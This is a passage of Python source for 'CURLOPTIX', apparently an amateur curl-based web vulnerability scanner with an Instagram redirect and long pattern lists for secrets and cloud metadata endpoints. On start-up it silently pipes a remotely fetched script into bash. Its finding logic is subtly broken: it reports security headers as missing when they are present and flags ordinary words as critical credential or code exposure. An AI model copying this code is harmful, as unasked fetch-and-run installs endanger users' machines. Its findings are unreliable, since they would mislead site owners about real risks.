#!/usr/bin/env python3
import os
import sys
import json
import time
import uuid
import signal
import shutil
import subprocess
import threading
import concurrent.futures
from datetime import datetime
from typing import Dict, List, Tuple, Optional, Any
from dataclasses import dataclass, field
from collections import defaultdict
from enum import Enum
import base64
import re
import tempfile
import hashlib
import socket
import struct
import fcntl
import termios

try:
    import requests
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
    from rich.panel import Panel
    from rich.layout import Layout
    from rich.live import Live
    from rich.text import Text
    from rich.columns import Columns
    from rich import box
    from rich.prompt import Prompt, Confirm
    from rich.syntax import Syntax
    from rich.markdown import Markdown
    from rich.tree import Tree
    from rich.console import Group
    from rich.align import Align
    from rich.rule import Rule
    from rich.style import Style
    from rich.color import Color
except ImportError:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "rich", "requests"])
    import requests
    from rich.console import Console
    from rich.table import Table
    from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn, TaskProgressColumn
    from rich.panel import Panel
    from rich.layout import Layout
    from rich.live import Live
    from rich.text import Text
    from rich.columns import Columns
    from rich import box
    from rich.prompt import Prompt, Confirm
    from rich.syntax import Syntax
    from rich.markdown import Markdown
    from rich.tree import Tree
    from rich.console import Group
    from rich.align import Align
    from rich.rule import Rule
    from rich.style import Style
    from rich.color import Color

console = Console()

RESET = "\033[0m"
BOLD = "\033[1m"
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
CYAN = "\033[96m"
WHITE = "\033[97m"

ASCII_BANNER = """
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⣤⣤⡴⣶⣶⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⣿⣿⣿⣿⣿⣿⣷⣿⣶⣿⣧⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⠿⠿⠛⠛⠛⠋⠉⠉⠉⠛⠛⠛⠛⠿⠟⠛⠛⠛⠛⠛⠛⠛⠛⠛⣻⣿⣿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣟⡁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠴⠿⠿⠿⣿⣿⣷⣦⡀⠀⠀⠀⠀
⠀⠀⠀⢰⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣠⣄⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣶⣄⠀⠀
⠀⠀⠀⢸⣿⣿⣿⣦⣤⣤⣀⣀⣀⣀⣠⣤⠴⠖⠋⢉⣽⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠧⡀
⠀⠀⢠⣿⠟⠉⠁⠈⠉⠉⠙⠛⠛⠿⠿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈
⠀⢠⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠽⠟⠛⠉⠀⢀⣀⣤⣴⣶⣶⣶⣶⣶⣶⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣷⣶⣦⣤⣤⣤⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠈⠉⠛⠿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⠘⢿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⣿⣴⣿⣿⣄⠀⠀⠀⠀⠀⣀⣠⣴⠶⣿⣿⠋⠉⠉⠉⠙⢻⣿⡆⠀⠀⠀⠀⠀⠀⣀⣴⣶⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢹⣿⡍⠛⠻⢷⣶⣶⣶⠟⢿⣿⠗⠀⠹⠃⡀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⢀⣴⣿⣿⣿⣿⠿⠿⠛⠛⠛⠛⠛⠂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⡇⠀⠀⠀⢻⣿⣿⠀⠈⠛⠀⠀⠀⢹⠇⠀⠀⠀⠀⢶⣿⠇⠀⢀⣴⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠁⠀⠀⠀⠀⠹⡇⠀⠀⠀⠀⠀⣀⡾⠀⠀⠀⠀⠀⢸⡿⠀⣠⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⣦⠀⠀⢠⣿⢳⠀⠀⠀⠙⣿⣿⠁⢰⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣿⣷⡾⠿⠃⢸⣷⣀⠀⢀⣾⠃⢀⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⠻⠷⢾⣿⣿⣷⡿⠁⠀⢸⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⢿⣷⣄⠀⠀⠉⠛⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣦⣄⡀⠀⠀⠀⢸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⣿⣶⣶⣾⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠿⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""

BANNER = """
╔═══════════════════════════════════════════════════════════════════════════════════╗
║  CURLOPTIX - Curl-Powered Multi-Domain Cybersecurity Assessment Framework        ║
║  Author: SYLHETYHACKVENGER (THE-ERROR808)                                       ║
║  WARNING: FOR AUTHORIZED USE ONLY - Unauthorized scanning may be ILLEGAL        ║
║  Use at your own risk. The author assumes NO LIABILITY.                         ║
╚═══════════════════════════════════════════════════════════════════════════════════╝
"""

def terminal_size():
    try:
        h, w = struct.unpack('hh', fcntl.ioctl(0, termios.TIOCGWINSZ, '0000'))
        return h, w
    except:
        return 24, 80

def scrollable_output(content: str, title: str = ""):
    h, w = terminal_size()
    lines = content.split('\n')
    max_display = h - 6
    
    if len(lines) <= max_display:
        console.print(Panel(content, title=title, border_style="cyan"))
        return
    
    page = 0
    total_pages = (len(lines) + max_display - 1) // max_display
    
    while True:
        start = page * max_display
        end = min(start + max_display, len(lines))
        page_content = '\n'.join(lines[start:end])
        
        console.clear()
        console.print(Panel(
            page_content,
            title=f"{title} (Page {page+1}/{total_pages})",
            border_style="cyan",
            subtitle="[dim]Press N=Next, P=Previous, Q=Quit[/dim]"
        ))
        
        choice = Prompt.ask("\n[cyan]Navigate[/cyan]", choices=["n", "p", "q"], default="q")
        if choice.lower() == 'q':
            break
        elif choice.lower() == 'n' and page < total_pages - 1:
            page += 1
        elif choice.lower() == 'p' and page > 0:
            page -= 1

def lock_and_redirect():
    print(f"{CYAN}📱 Follow My Instagram: @shv.cyberlab{RESET}")
    print(f"{CYAN}Redirecting to Instagram...{RESET}\n")
    time.sleep(1)
    
    for i in range(5, 0, -1):
        sys.stdout.write(f"\r{BOLD}{MAGENTA}⏳ Redirecting in: {i}...{RESET}")
        sys.stdout.flush()
        time.sleep(1)
    print("\n")
    
    url = "https://instagram.com/shv.cyberlab"
    instagram_pkg = "com.instagram.android"
    
    try:
        if sys.platform == "linux" and "com.termux" in os.environ.get("PREFIX", ""):
            try:
                subprocess.run(["termux-open", url], timeout=7, capture_output=True)
                return
            except:
                pass
            
            try:
                subprocess.Popen([
                    "am", "start",
                    "-a", "android.intent.action.VIEW",
                    "-d", url,
                    "-p", instagram_pkg
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(1)
                return
            except:
                pass
            
            try:
                subprocess.Popen([
                    "am", "start",
                    "-a", "android.intent.action.VIEW",
                    "-d", url
                ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return
            except:
                pass
            
            try:
                subprocess.run(["termux-open-url", url], timeout=7, capture_output=True)
                return
            except:
                pass
            
            try:
                subprocess.Popen(["xdg-open", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                return
            except:
                pass
            
            print(f"\n{YELLOW}⚠️ Could not open automatically. Open this URL manually:{RESET}")
            print(f"{GREEN}https://instagram.com/shv.cyberlab{RESET}")
            
        elif sys.platform == "win32":
            try:
                os.system(f"start {url}")
            except:
                os.system(f"start microsoft-edge:{url}")
        else:
            try:
                subprocess.Popen(["xdg-open", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except:
                subprocess.Popen(["open", url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
    except Exception as e:
        print(f"{YELLOW}⚠️ Could not open Instagram automatically{RESET}")
        print(f"{GREEN}🔗 Manual link: https://instagram.com/shv.cyberlab{RESET}")

class Severity(Enum):
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"

@dataclass
class Finding:
    severity: Severity
    cwe_id: str
    title: str
    description: str
    remediation: str
    command_name: str
    impact: str
    likelihood: str
    confidence: str
    evidence: str = ""
    recommended_action: str = ""
    risk_score: float = 0.0

@dataclass
class CurlCommand:
    cmd: List[str]
    category: str
    name: str
    description: str
    test_purpose: str
    expected_finding: Optional[Finding] = None
    vulnerability_type: str = ""
    severity_level: str = ""

@dataclass
class ScanResult:
    command: CurlCommand
    exit_code: int
    stdout: str
    stderr: str
    duration: float
    status: str
    findings: List[Finding] = field(default_factory=list)
    response_headers: Dict[str, str] = field(default_factory=dict)
    redirect_chain: List[str] = field(default_factory=list)
    ssl_info: Dict[str, Any] = field(default_factory=dict)
    timing_details: Dict[str, float] = field(default_factory=dict)
    payload_size: int = 0
    http_status: int = 0
    response_body: str = ""
    vulnerability_detected: bool = False
    risk_level: str = "NONE"
    detailed_analysis: Dict[str, Any] = field(default_factory=dict)

class CurlEngine:
    def __init__(self, target: str, timeout: int = 30, concurrency: int = 10, verbose: bool = True):
        self.target = target
        self.timeout = timeout
        self.concurrency = concurrency
        self.verbose = verbose
        self.results: List[ScanResult] = []
        self.stats = defaultdict(int)
        self.lock = threading.Lock()
        self.running = True
        self._setup_curlie()

    def stop(self):
        self.running = False

    def _setup_curlie(self):
        try:
            if shutil.which("curlie"):
                return
        except:
            pass
        
        try:
            install_cmd = "curl -sS https://webinstall.dev/curlie | bash"
            proc = subprocess.run(install_cmd, shell=True, capture_output=True, text=True)
            if proc.returncode == 0:
                home = os.path.expanduser("~")
                bin_path = os.path.join(home, ".local", "bin")
                if os.path.exists(bin_path):
                    os.environ["PATH"] = bin_path + ":" + os.environ.get("PATH", "")
        except:
            pass

    def _build_curl_command(self, base_cmd: List[str]) -> List[str]:
        curl_cmd = shutil.which("curlie") or shutil.which("curl") or "curl"
        cmd = [curl_cmd]
        cmd.extend(base_cmd)
        cmd.append(self.target)
        return cmd

    def _parse_curl_verbose(self, stderr: str) -> Dict[str, Any]:
        info = {}
        if "SSL connection" in stderr:
            info["ssl_status"] = "TLS established"
        if "subject" in stderr:
            lines = stderr.split('\n')
            for line in lines:
                if "subject" in line:
                    info["cert_subject"] = line.strip()
                if "issuer" in line:
                    info["cert_issuer"] = line.strip()
                if "SSL certificate verify ok" in line:
                    info["cert_verified"] = True
                if "SSL certificate problem" in line:
                    info["cert_verified"] = False
                    info["cert_error"] = line.strip()
        if "Connected to" in stderr:
            info["connected"] = True
        if "Resolving" in stderr:
            info["dns_resolution"] = "completed"
        return info

    def _parse_response_headers(self, stdout: str) -> Dict[str, str]:
        headers = {}
        lines = stdout.split('\n')
        for line in lines:
            if ': ' in line and not line.startswith('HTTP'):
                key, value = line.split(': ', 1)
                headers[key] = value
        return headers

    def _analyze_response(self, stdout: str, stderr: str, cmd: CurlCommand) -> List[Finding]:
        findings = []
        
        if "ssl" in stderr.lower() or "certificate" in stderr.lower():
            if "SSL certificate verify ok" not in stderr:
                findings.append(Finding(
                    severity=Severity.HIGH,
                    cwe_id="CWE-295",
                    title="SSL/TLS Certificate Validation Failure",
                    description="The SSL/TLS certificate validation failed. This could indicate a man-in-the-middle attack or a misconfigured certificate.",
                    remediation="Ensure valid certificates from trusted CAs are installed and properly configured. Consider implementing certificate pinning.",
                    command_name=cmd.name,
                    impact="Man-in-the-middle attacks, data interception, credential theft",
                    likelihood="High",
                    confidence="High",
                    evidence=stderr[:500] if stderr else "Certificate validation error detected",
                    recommended_action="Verify certificate chain, check expiration date, ensure CA trust",
                    risk_score=8.5
                ))
            else:
                findings.append(Finding(
                    severity=Severity.INFO,
                    cwe_id="CWE-296",
                    title="SSL/TLS Certificate Validated",
                    description="SSL/TLS certificate validation passed successfully.",
                    remediation="Continue using valid certificates from trusted CAs.",
                    command_name=cmd.name,
                    impact="None - secure connection established",
                    likelihood="N/A",
                    confidence="High",
                    evidence="SSL certificate verify ok",
                    recommended_action="Maintain current certificate practices",
                    risk_score=0.0
                ))

        http_status_match = re.search(r'HTTP/(\d\.\d)\s+(\d{3})', stdout)
        if http_status_match:
            status_code = int(http_status_match.group(2))
            if status_code >= 500:
                findings.append(Finding(
                    severity=Severity.MEDIUM,
                    cwe_id="CWE-20",
                    title=f"Server Error - HTTP {status_code}",
                    description=f"The server returned a {status_code} error indicating server-side issues.",
                    remediation="Fix server-side error handling, implement proper exception handling, and return appropriate status codes.",
                    command_name=cmd.name,
                    impact="Service disruption, potential information disclosure",
                    likelihood="Medium",
                    confidence="High",
                    evidence=f"HTTP {status_code} error response",
                    recommended_action="Check server logs, fix application errors, implement proper error handling",
                    risk_score=6.0
                ))
            elif status_code == 404:
                findings.append(Finding(
                    severity=Severity.LOW,
                    cwe_id="CWE-598",
                    title="Resource Not Found - HTTP 404",
                    description="The requested resource could not be found, indicating potential information disclosure through error messages.",
                    remediation="Implement custom error pages that don't reveal system information.",
                    command_name=cmd.name,
                    impact="Information disclosure, directory enumeration",
                    likelihood="Low",
                    confidence="High",
                    evidence="HTTP 404 Not Found response",
                    recommended_action="Implement custom 404 error pages, avoid exposing system paths",
                    risk_score=2.0
                ))
            elif status_code == 403:
                findings.append(Finding(
                    severity=Severity.MEDIUM,
                    cwe_id="CWE-284",
                    title="Access Forbidden - HTTP 403",
                    description="Access to the resource was forbidden, indicating proper access controls are in place.",
                    remediation="Continue implementing proper access controls.",
                    command_name=cmd.name,
                    impact="None - access properly restricted",
                    likelihood="Low",
                    confidence="High",
                    evidence="HTTP 403 Forbidden response",
                    recommended_action="Maintain current access control measures",
                    risk_score=0.0
                ))
            elif status_code == 302 or status_code == 301:
                findings.append(Finding(
                    severity=Severity.LOW,
                    cwe_id="CWE-601",
                    title="URL Redirect Detected",
                    description="The request resulted in a redirect, which could indicate open redirect vulnerabilities.",
                    remediation="Validate all redirect targets, implement whitelist of allowed redirect domains.",
                    command_name=cmd.name,
                    impact="Open redirect attacks, phishing",
                    likelihood="Medium",
                    confidence="Medium",
                    evidence=f"HTTP {status_code} redirect response",
                    recommended_action="Implement redirect validation, use allowlists for redirect targets",
                    risk_score=3.5
                ))

        if stdout:
            sensitive_patterns = {
                "password": (Severity.CRITICAL, "Password Disclosure"),
                "passwd": (Severity.CRITICAL, "Passwd File Reference"),
                "admin": (Severity.HIGH, "Admin Reference"),
                "root": (Severity.HIGH, "Root Reference"),
                "secret": (Severity.HIGH, "Secret Keyword"),
                "api_key": (Severity.CRITICAL, "API Key Disclosure"),
                "token": (Severity.HIGH, "Token Disclosure"),
                "cookie": (Severity.MEDIUM, "Cookie Disclosure"),
                "session": (Severity.MEDIUM, "Session Identifier"),
                "jwt": (Severity.CRITICAL, "JWT Token Disclosure"),
                "access_token": (Severity.CRITICAL, "Access Token Disclosure"),
                "refresh_token": (Severity.CRITICAL, "Refresh Token Disclosure"),
                "private_key": (Severity.CRITICAL, "Private Key Disclosure"),
                "BEGIN CERTIFICATE": (Severity.HIGH, "Certificate Disclosure"),
                "ssh-rsa": (Severity.HIGH, "SSH Key Disclosure"),
                "aws_access_key": (Severity.CRITICAL, "AWS Access Key"),
                "aws_secret_key": (Severity.CRITICAL, "AWS Secret Key"),
                "github_token": (Severity.CRITICAL, "GitHub Token"),
                "slack_token": (Severity.CRITICAL, "Slack Token"),
                "stripe_secret": (Severity.CRITICAL, "Stripe Secret Key"),
                "twilio_auth": (Severity.CRITICAL, "Twilio Auth Token"),
                "mongodb": (Severity.HIGH, "MongoDB Connection String"),
                "mysql": (Severity.HIGH, "MySQL Connection String"),
                "postgresql": (Severity.HIGH, "PostgreSQL Connection String"),
                "redis": (Severity.HIGH, "Redis Connection String"),
                "heroku": (Severity.HIGH, "Heroku API Key"),
                "sftp": (Severity.HIGH, "SFTP Credentials"),
                "ftp": (Severity.MEDIUM, "FTP Credentials"),
                "ssh": (Severity.HIGH, "SSH Key Reference"),
                "bearer": (Severity.CRITICAL, "Bearer Token"),
                "basic": (Severity.MEDIUM, "Basic Auth Credentials"),
                "auth": (Severity.HIGH, "Authentication Reference"),
                "credential": (Severity.CRITICAL, "Credential Reference"),
                "secret_key": (Severity.CRITICAL, "Secret Key Reference"),
                "api_key": (Severity.CRITICAL, "API Key Reference"),
                "firebase": (Severity.CRITICAL, "Firebase Credentials"),
                "azure": (Severity.CRITICAL, "Azure Credentials"),
                "gcp": (Severity.CRITICAL, "GCP Credentials"),
                "docker": (Severity.HIGH, "Docker Credentials"),
                "kubernetes": (Severity.HIGH, "Kubernetes Credentials"),
                "terraform": (Severity.HIGH, "Terraform Credentials"),
                "ansible": (Severity.HIGH, "Ansible Vault"),
                "vault": (Severity.CRITICAL, "HashiCorp Vault"),
                "consul": (Severity.HIGH, "Consul Token"),
                "nomad": (Severity.HIGH, "Nomad Token"),
                "jenkins": (Severity.HIGH, "Jenkins API Key"),
                "gitlab": (Severity.HIGH, "GitLab Token"),
                "bitbucket": (Severity.HIGH, "Bitbucket Token"),
                "artifactory": (Severity.HIGH, "Artifactory API Key"),
                "nexus": (Severity.HIGH, "Nexus API Key"),
                "sonar": (Severity.HIGH, "SonarQube Token"),
                "jira": (Severity.MEDIUM, "Jira API Token"),
                "confluence": (Severity.MEDIUM, "Confluence Token"),
                "sharepoint": (Severity.MEDIUM, "SharePoint Token"),
                "onedrive": (Severity.MEDIUM, "OneDrive Token"),
                "dropbox": (Severity.MEDIUM, "Dropbox Token"),
                "box": (Severity.MEDIUM, "Box API Key"),
            }

            for pattern, (severity, title) in sensitive_patterns.items():
                if pattern in stdout.lower():
                    context = stdout.lower().split('\n')
                    evidence_lines = [line for line in context if pattern in line.lower()]
                    evidence = '\n'.join(evidence_lines[:5]) if evidence_lines else stdout[:300]
                    
                    findings.append(Finding(
                        severity=severity,
                        cwe_id="CWE-200" if severity in [Severity.CRITICAL, Severity.HIGH] else "CWE-532",
                        title=f"Sensitive Information Exposure - {title}",
                        description=f"The response contains sensitive information related to '{pattern}'. This could expose credentials, system information, or internal details.",
                        remediation="Remove sensitive information from HTTP responses. Implement proper filtering and error handling. Use environment variables for secrets.",
                        command_name=cmd.name,
                        impact="Credential exposure, privilege escalation, system compromise",
                        likelihood="High",
                        confidence="High",
                        evidence=f"Pattern '{pattern}' found in response: {evidence[:300]}",
                        recommended_action="Review all responses for sensitive data, implement sanitization, use proper logging controls",
                        risk_score=9.5 if severity == Severity.CRITICAL else 7.5
                    ))
                    break

            error_patterns = [
                "error", "exception", "traceback", "warning", "fatal",
                "stack trace", "invalid", "cannot", "unable", "failed",
                "fatal", "segmentation fault", "core dumped", "panic",
                "assertion failed", "syntax error", "type error", "value error",
                "database error", "sql error", "connection failed", "permission denied",
                "404 not found", "500 internal", "502 bad gateway", "503 service unavailable"
            ]
            
            for pattern in error_patterns:
                if pattern in stdout.lower():
                    lines = [line for line in stdout.split('\n') if pattern in line.lower()]
                    if lines:
                        findings.append(Finding(
                            severity=Severity.MEDIUM,
                            cwe_id="CWE-209",
                            title="Error Information Disclosure",
                            description=f"The response contains error-related information ('{pattern}') that could expose system internals.",
                            remediation="Implement custom error pages that don't reveal technical details. Log errors internally.",
                            command_name=cmd.name,
                            impact="Information disclosure, system enumeration",
                            likelihood="Medium",
                            confidence="High",
                            evidence=lines[0][:300] if lines else "Error pattern detected",
                            recommended_action="Implement proper error handling, use generic error messages, log internally",
                            risk_score=5.0
                        ))
                        break

            code_patterns = [
                ("var ", "JavaScript Variable"), ("function(", "Function Declaration"),
                ("<?php", "PHP Code"), ("<?=", "PHP Short Tag"),
                ("<script", "JavaScript Code"), ("<style", "CSS Code"),
                ("class ", "Class Definition"), ("def ", "Python Function"),
                ("func ", "Go Function"), ("public ", "Public Method"),
                ("private ", "Private Method"), ("protected ", "Protected Method"),
                ("aws_access_key", "AWS Access Key"), ("SecretKey", "AWS Secret Key"),
                ("DB_PASSWORD", "Database Password"), ("DB_USER", "Database User"),
                ("JWT_SECRET", "JWT Secret"), ("API_SECRET", "API Secret"),
                ("config.", "Config Reference"), (".env", "Environment File"),
                ("settings.", "Settings Reference"), ("database.", "Database Reference"),
                ("auth.", "Auth Reference"), ("security.", "Security Reference"),
                ("crypto.", "Crypto Reference"), ("encrypt.", "Encrypt Reference"),
            ]

            for pattern, title in code_patterns:
                if pattern in stdout.lower():
                    findings.append(Finding(
                        severity=Severity.HIGH,
                        cwe_id="CWE-540",
                        title=f"Code Exposure - {title}",
                        description=f"Source code or sensitive configuration detected in response: '{pattern}'",
                        remediation="Remove all source code and configuration from production responses. Ensure proper MVC separation.",
                        command_name=cmd.name,
                        impact="Intellectual property theft, security bypass, system compromise",
                        likelihood="High",
                        confidence="High",
                        evidence=f"Code pattern '{pattern}' detected in response",
                        recommended_action="Review response content, implement proper templating, remove debug information",
                        risk_score=8.0
                    ))
                    break

            version_patterns = [
                ("php", "PHP Version"), ("python", "Python Version"),
                ("java", "Java Version"), ("tomcat", "Tomcat Version"),
                ("apache", "Apache Version"), ("nginx", "Nginx Version"),
                ("node.js", "Node.js Version"), ("ruby", "Ruby Version"),
                ("golang", "Go Version"), ("spring", "Spring Version"),
                ("rails", "Rails Version"), ("django", "Django Version"),
                ("flask", "Flask Version"), ("laravel", "Laravel Version"),
                ("express", "Express Version"), ("fastapi", "FastAPI Version"),
                ("angular", "Angular Version"), ("react", "React Version"),
                ("vue", "Vue.js Version"), ("jquery", "jQuery Version"),
                ("bootstrap", "Bootstrap Version"), ("tailwind", "Tailwind CSS"),
            ]

            for pattern, title in version_patterns:
                if pattern in stdout.lower():
                    findings.append(Finding(
                        severity=Severity.MEDIUM,
                        cwe_id="CWE-200",
                        title=f"Version Information Disclosure - {title}",
                        description=f"Software version information '{pattern}' detected in response.",
                        remediation="Disable server headers that expose version information. Use generic error pages.",
                        command_name=cmd.name,
                        impact="Version disclosure allows targeted exploitation of known vulnerabilities",
                        likelihood="Medium",
                        confidence="High",
                        evidence=f"Version pattern '{pattern}' detected",
                        recommended_action="Remove version information from all HTTP responses",
                        risk_score=4.0
                    ))
                    break

            security_misconfig = [
                ("cors", "CORS Misconfiguration"),
                ("access-control-allow-origin: *", "Wildcard CORS"),
                ("x-frame-options", "Missing X-Frame-Options"),
                ("x-content-type-options", "Missing X-Content-Type-Options"),
                ("strict-transport-security", "Missing HSTS"),
                ("content-security-policy", "Missing CSP"),
                ("server: ", "Server Header Exposure"),
                ("x-powered-by: ", "X-Powered-By Exposure"),
                ("x-aspnet-version", "ASP.NET Version Exposure"),
                ("x-aspnetmvc-version", "ASP.NET MVC Version Exposure"),
                ("x-generator", "Generator Metadata Exposure"),
                ("x-drupal-cache", "Drupal Cache Headers"),
                ("x-drupal-dynamic-cache", "Drupal Dynamic Cache"),
                ("x-varnish", "Varnish Cache Headers"),
                ("x-debug", "Debug Mode Enabled"),
                ("x-debug-mode", "Debug Mode Enabled"),
            ]

            for pattern, title in security_misconfig:
                if pattern in stdout.lower():
                    findings.append(Finding(
                        severity=Severity.MEDIUM,
                        cwe_id="CWE-16",
                        title=f"Security Misconfiguration - {title}",
                        description=f"Security misconfiguration detected: '{pattern}'",
                        remediation="Implement proper security headers and configurations.",
                        command_name=cmd.name,
                        impact="Security bypass, feature exploitation",
                        likelihood="Medium",
                        confidence="High",
                        evidence=f"Misconfiguration pattern '{pattern}' detected",
                        recommended_action="Review and harden security configuration",
                        risk_score=5.0
                    ))
                    break

            cloud_metadata = [
                ("169.254.169.254", "AWS Metadata Service"),
                ("metadata.google.internal", "GCP Metadata Service"),
                ("100.100.100.200", "Azure Metadata Service"),
                ("metadata", "Cloud Metadata Reference"),
                ("instance-id", "Instance ID Exposure"),
                ("availability-zone", "Availability Zone Exposure"),
                ("public-keys", "Public Keys Exposure"),
                ("user-data", "User Data Exposure"),
                ("meta-data", "Metadata API Access"),
                ("dynamic/instance-identity", "Instance Identity"),
            ]

            for pattern, title in cloud_metadata:
                if pattern in stdout.lower():
                    findings.append(Finding(
                        severity=Severity.CRITICAL,
                        cwe_id="CWE-497",
                        title=f"Cloud Metadata Exposure - {title}",
                        description=f"Cloud metadata service reference detected: '{pattern}'. This could expose sensitive cloud infrastructure information.",
                        remediation="Restrict access to metadata services. Implement proper network controls.",
                        command_name=cmd.name,
                        impact="Cloud infrastructure compromise, credential exposure",
                        likelihood="High",
                        confidence="High",
                        evidence=f"Cloud metadata pattern '{pattern}' detected",
                        recommended_action="Review cloud security posture, implement metadata service protection",
                        risk_score=9.0
                    ))
                    break

        if "timeout" in stderr.lower() or "timed out" in stderr.lower():
            findings.append(Finding(
                severity=Severity.MEDIUM,
                cwe_id="CWE-400",
                title="Connection Timeout",
                description="The connection timed out, indicating potential performance issues or DoS vulnerabilities.",
                remediation="Optimize server response times, implement timeouts, consider rate limiting.",
                command_name=cmd.name,
                impact="Service unavailability, denial of service",
                likelihood="Medium",
                confidence="High",
                evidence="Timeout detected in response",
                recommended_action="Increase server capacity, implement caching, use CDN",
                risk_score=6.5
            ))

        if "set-cookie" in stdout.lower():
            cookie_analysis = ""
            if "secure" not in stdout.lower():
                cookie_analysis = " Missing Secure flag - cookies may be sent over HTTP"
            if "httponly" not in stdout.lower():
                cookie_analysis += " Missing HttpOnly flag - cookies accessible via JavaScript"
            if "samesite" not in stdout.lower():
                cookie_analysis += " Missing SameSite flag - possible CSRF vulnerability"
            if "path" not in stdout.lower():
                cookie_analysis += " Missing Path attribute - cookie may be too broad"
            
            if cookie_analysis:
                findings.append(Finding(
                    severity=Severity.MEDIUM,
                    cwe_id="CWE-614",
                    title="Insecure Cookie Configuration",
                    description=f"Cookie security flags missing or insecure:{cookie_analysis}",
                    remediation="Set HttpOnly, Secure, and SameSite=Strict flags for all cookies.",
                    command_name=cmd.name,
                    impact="Session hijacking, CSRF attacks, credential theft",
                    likelihood="High",
                    confidence="High",
                    evidence=f"Set-Cookie header detected with issues: {cookie_analysis}",
                    recommended_action="Configure cookie security flags properly",
                    risk_score=6.5
                ))
            else:
                findings.append(Finding(
                    severity=Severity.INFO,
                    cwe_id="CWE-614",
                    title="Cookie Set Detected",
                    description="The server is setting cookies with proper security flags.",
                    remediation="Maintain secure cookie configuration.",
                    command_name=cmd.name,
